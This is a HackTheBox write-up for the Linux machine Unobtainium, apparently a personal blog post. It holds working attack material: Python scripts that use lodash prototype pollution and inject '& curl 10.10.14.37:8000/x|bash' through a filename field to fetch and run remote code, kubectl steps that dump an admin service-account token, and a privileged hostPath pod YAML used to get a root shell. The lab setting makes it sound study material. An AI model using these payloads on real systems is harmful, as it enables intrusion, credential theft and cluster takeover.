---
title: HackTheBox - Unobtainium Writeup
subtitle: Here's my writeup for the RETIRED machine Unobtainium, Which is a hard Linux machine!
# Summary for listings and search engines
summary: Here's my writeup for the RETIRED machine Unobtainium, Which is a hard Linux machine!



# Link this post with a project
projects: []

# Date published
# Date published
date: "2021-09-04T00:00:00Z"

# Date updated
lastmod: "2021-09-04T00:00:00Z"
# Is this an unpublished draft?
draft: false

# Show this page in the Featured widget?
featured: false

# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
image:
  caption: 'Image credit: [**HackTheBox**]'
  focal_point: ""
  placement: 2
  preview_only: false

authors:
- admin


tags:
- HackTheBox


---






# <p style="color:RED">Information Gathering </p>

---

## <p style="color:Green">Nmap scan </p> 
```bash
sudo nmap -sC -sV 10.10.10.235 -v
```

```
Discovered open port 80/tcp on 10.10.10.235
Discovered open port 22/tcp on 10.10.10.235
Discovered open port 31337/tcp on 10.10.10.235
Discovered open port 8443/tcp on 10.10.10.235
```

## <p style="color:Green">Web Enumeration </p> 

Nothing really interesting except for the 3 downloadable files!

<img src="web.png">

Let's get the deb one!
<img src="zip.png">

# <p style="color:RED">Foothold </p>

Let's now extract the files inside the .deb file that we got

```
dpkg-deb -xv unobtainium_1.0.0_amd64.deb writeup
```

<img src="extract.png">

Inside ./opt/unobtainium/ we can find an executable

<img src="exec.png">

We can solve this error by adding `unobtainium.htb` to our /etc/hosts file

<img src="exec1.png">

Nothing really interesting in the logs except of finding a potential username `felamos`

<img src="exec2.png">

We can also Post messages, let's try to capture the traffic with wireshark when sending a message

<img src="wireshark.png">

We already capture some data even before sending any thing, which seems odd

Let's check what he have


<img src="wire1.png">
<img src="wire2.png">

Very interesting! we get creds
```
felamos:Winter2021
```

And also we can see that there is a potential LFI! Let's try to abuse it

After trying few commun files `index.js` gave me something


<img src="ind.png">


```js
var root = require("google-cloudstorage-commands");
const express = require('express');
const { exec } = require("child_process");     
const bodyParser = require('body-parser');     
const _ = require('lodash');                                                                  
const app = express();
var fs = require('fs');

const users = [                                                                               
  {name: 'felamos', password: 'Winter2021'},
  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},      
  ];

let messages = [];                             
let lastId = 1;                                

function findUser(auth) {                                                                     
  return users.find((u) =>                                                                    
    u.name === auth.name &&                                                                   
    u.password === auth.password);                                                            
    }                                    

app.use(bodyParser.json());                                                                   

app.get('/', (req, res) => {                   
  res.send(messages);                                                                         
  });                                                                                           

app.put('/', (req, res) => {   
  const user = findUser(req.body.auth || {});                                                 

  if (!user) {                                 
    res.status(403).send({ok: false, error: 'Access denied'});                                
    return;
  }

  const message = {
    icon: '__',
  };

  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });

  messages.push(message);
  res.send({ok: true});
  });

app.delete('/', (req, res) => {
  const user = findUser(req.body.auth || {});

  if (!user || !user.canDelete) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  messages = messages.filter((m) => m.id !== req.body.messageId);
  res.send({ok: true});
  });
app.post('/upload', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }


  filename = req.body.filename;
  root.upload("./",filename, true);
  res.send({ok: true, Uploaded_File: filename});
  });

app.post('/todo', (req, res) => {
    const user = findUser(req.body.auth || {});
    if (!user) {
        res.status(403).send({ok: false, error: 'Access denied'});
        return;
    }

    filename = req.body.filename;
        testFolder = "/usr/src/app";
        fs.readdirSync(testFolder).forEach(file => {
                if (file.indexOf(filename) > -1) {
                        var buffer = fs.readFileSync(filename).toString();
                        res.send({ok: true, content: buffer});
                }
        });
        });

app.listen(3000);
console.log('Listening on port 3000...');

```

We can also get `package.json`

```json
{
  "name": "Unobtainium-Server",
  "version": "1.0.0",
  "description": "API Service for Electron client",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "author": "felamos",
  "license": "ISC",
  "dependencies": {
    "body-parser": "1.18.3",
    "express": "4.16.4",
    "lodash": "4.17.4",
    "google-cloudstorage-commands": "0.0.1"
  },
  "devDependencies": {}
  }
```
There is an interesting /upload endpoint, let's try if we can upload anything! but sadly that didn't work, we didn't have permissions



After searching a bit we can find that loadsh 4.17.4 is vulnerable to Prototype Pollution

> https://snyk.io/test/npm/lodash/4.17.4

And also google-cloudstorage-commands is vulnerable to RCE


> https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431


The next step to do now is pretty straightforward after knowing these 2 exploits!

The /upload endpoint is what we'll be looking for now! It will be enough to get us into the machine

```js

app.post('/upload', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }


  filename = req.body.filename;
  root.upload(\"./\",filename, true);
  res.send({ok: true, Uploaded_File: filename});
  });
```
First we need to pollute `canUpload` and changes its value to `true`. here a little python script to do it

```python
import requests

headers = {
    'content-type': 'application/json',
}

data = '{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"__proto__":{canUpload":true}}}'

response = requests.put('http://unobtainium.htb:31337/', headers=headers, data=data)
print(response.text)
``` 

<img src="pollute.png">
Looks like it worked!!

Now all we need to do is upload a filename which is our payload!
```
filename="& PAYLOAD"
```
<img src="rce.png">

Here's a python script to do it

```python
import requests

headers = {
    'Host': 'unobtainium.htb:31337',
    'Connection': 'keep-alive',
    'Content-Length': '90',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US',
}

data = '{\\"auth\\":{\\"name\\":\\"felamos\\",\\"password\\":\\"Winter2021\\"},\\"filename\\":\\"& curl 10.10.14.37:8000/x|bash\\"}'

response = requests.post('http://unobtainium.htb:31337/upload', headers=headers, data=data, verify=False)

```

<img src="foothold.png">

And we're on the box!

# <p style="color:RED">Root PrivEsc </p>


Running linpeas we can see that we're in a container

```
[+] Is this a container? ........... Looks like we're in a Docker container
```


Also a weird crontab that's looking for the kubectl binary on the system and deletes it

```
* * * * * find / -name kubectl -exec rm {} \;
```
> we can eaisly bypass this by changing the name of the binary

Which is  the Kubernetes CLI tool that can enumerate and run commands against kubernetes clusters! 

Let's get that binary into the box and start enumerating with it


> Following any kubectl cheatcheet can do the trick!

Let's find start by getting the namespaces

```
./kc get namespaces
```
<img src="ns.png">

The interesting one is dev!

Let's now list the pods in the dev namespace


```
./kc get pods -n dev
```
<img src="pods.png">

There is now an interesting feature which is describe which can give us almost all the informations we need


```
./kc describe pod/devnode-deployment-cd86fb5c-6ms8d -n dev
```


```
Name:         devnode-deployment-cd86fb5c-6ms8d
Namespace:    dev
Priority:     0
Node:         unobtainium/10.10.10.235
Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
Labels:       app=devnode
              pod-template-hash=cd86fb5c
Annotations:  <none>
Status:       Running
IP:           172.17.0.5
IPs:
  IP:           172.17.0.5
Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
Containers:
  devnode:
    Container ID:   docker://27a4149a9c4cc6730f21a43124b0ac8fa67eed9a7934cab4f9d95a30d1878e38
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Fri, 03 Sep 2021 05:08:42 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    137
      Started:      Mon, 26 Jul 2021 15:00:22 +0000
      Finished:     Mon, 26 Jul 2021 15:04:55 +0000
    Ready:          True
    Restart Count:  30
    Environment:    <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
Conditions:
  Type              Status
  Initialized       True 
  Ready             True 
  ContainersReady   True 
  PodScheduled      True 
Volumes:
  default-token-rmcd6:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-rmcd6
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          <none>

```

Seems like the pod is running on 172.17.0.5:3000

Let's fordward it to our box


<img src="forward.png">

Since we know that it's vulnerable to loadsh and we can turn it into an RCE! we'll be doing the same steps that we did for the foothold

```python
import requests

headers = {
    'content-type': 'application/json',
}

data = '{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"__proto__":{canUpload":true}}}'

response = requests.put('http://localhost:9090/', headers=headers, data=data)
print(response.text)
``` 

```python
import requests

headers = {
    'Host': 'localhost:9090',
    'Connection': 'keep-alive',
    'Content-Length': '90',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US',
}

data = '{\\"auth\\":{\\"name\\":\\"felamos\\",\\"password\\":\\"Winter2021\\"},\\"filename\\":\\"& curl 10.10.14.37:8000/x|bash\\"}'

response = requests.post('http://localhost:9090/upload', headers=headers, data=data, verify=False,proxies={'http':'http://127.0.0.1:8080'})

```


<img src="node.png">

and we get a shell in devnode


Now let's try if we can list secrets of the namespace kube-system


```
./kc auth can-i list secrets -n kube-system
```

<img src="secret.png">

now let's get them

```
./kc get secrets -n kube-system
```


```
root@devnode-deployment-cd86fb5c-6ms8d:~/.euch# ./kc get secrets -n kube-system

NAME                                             TYPE                                  DATA   AGE
attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      230d
bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      230d
c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      229d
certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      230d
..<snip>..
```

```c-admin-token-tfmp2``` is the interesting one which will give us the administrator token



```
./kc describe secrets/c-admin-token-tfmp2 -n kube-system
```


<img src="token.png">

```
eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
```
Now it's pretty much over!

> https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation

The only think left to check is if we're able to create pods

```
./kc --token=<token> auth can-i create pod
```

<img src="bad.png">

now we can use badpod as mentioned in the article

our yaml payload
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: localhost:5000/dev-alpine
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

Let's create the pod 
```
./kc create -f root.yaml --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow

```

And let's now get a root shell on the host

```
./kc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow exec -it everything-allowed-exec-pod -- chroot /host bash
```



<img src="root.png">


And we rooted the machine!

## Thanks for reading hope you enjoyed it!


